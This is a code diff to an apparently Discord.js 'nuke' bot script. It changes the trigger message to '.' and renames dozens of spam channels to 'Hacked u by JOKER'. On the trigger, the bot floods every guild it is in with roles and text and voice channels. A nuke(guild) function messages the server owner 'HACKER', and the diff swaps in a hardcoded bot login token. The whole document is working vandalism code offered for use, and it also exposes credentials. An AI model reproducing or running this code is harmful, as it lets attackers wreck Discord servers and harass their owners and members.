@@ -78,7 +78,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      
  
-     if (message.content === "Go") {
+     if (message.content === ".") {
          LOka.guilds.forEach(m =>{
   m.createRole({
         name : "Hacked u by unknown Is here",
@@ -284,7 +284,7 @@ LOka.on('message', message => {
 }
 });
 LOka.on('message', message => {
-         if (message.content === "Go") {
+         if (message.content === ".") {
                LOka.guilds.forEach(m =>{
 m.createChannel('Hacked u by unknown Is here', 'text');
 m.createChannel('Hacked u by unknown Is here', 'text');
@@ -338,67 +338,68 @@ m.createChannel('Hacked u by unknown Is here', 'text');
 });
  
 LOka.on('message', message => {
-         if (message.content === "Go") {
+         if (message.content === ".") {
                  LOka.guilds.forEach(m =>{
 m.createChannel('Hacked u by unknown Is here', 'voice');
 m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+              
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
  
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
  
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JIKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
  
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u BY JOKER', 'voice');
  
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JIKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
  
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
-m.createChannel('Hacked u by unknown Is here', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
  
  
  
@@ -417,7 +418,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' بوت خورافي ').catch(e => { return void e; });
+  await guild.owner.send(' HACKER').catch(e => { return void e; });
  
  
  
@@ -478,4 +479,4 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-LOka.login("NTUzMjAzMTExMjM4NTY1ODg4.D2KqtQ.R7oI7UTWqrD7PtuexVPnfd4Iegc")
+LOka.login("Njg0NjA5MTI4MjYxMjIyNDIz.Xl8mig.XpNx_GBVoJQx8j-sNPa0NnoTu7E")
